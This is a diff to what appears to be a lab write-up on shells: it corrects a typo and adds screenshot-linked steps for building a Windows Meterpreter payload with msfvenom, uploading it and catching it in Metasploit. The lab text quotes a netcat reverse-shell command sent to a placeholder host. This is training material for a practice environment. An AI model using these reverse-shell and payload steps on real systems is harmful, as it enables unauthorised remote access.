@@ -638,7 +638,7 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 * Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
 
-	* Creat file webshell 
+	* Create file webshell 
 
 		![task13-webshell](./images/task13-webshell.png)
 
@@ -758,7 +758,7 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 * Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
 
-	* Creat file webshell 
+	* Create file webshell 
 
 		![task13-webshell](./images/task13-webshell.png)
 
@@ -830,6 +830,18 @@ The remainder of this task will consist of shell examples for you to try out on 
 
 
 * Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
+
+	* Create a 64 bit Windows Meterpreter shell
+
+		![task13-win-creat-meterpreter](./images/task13-win-creat-meterpreter.png)
+
+	* Upload file shell.exe via browser
+
+		![task13-win-upload-exe](./images/task13-win-upload-exe.png)
+
+	* Run metasploit on our machine
+
+
 
 * Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
 
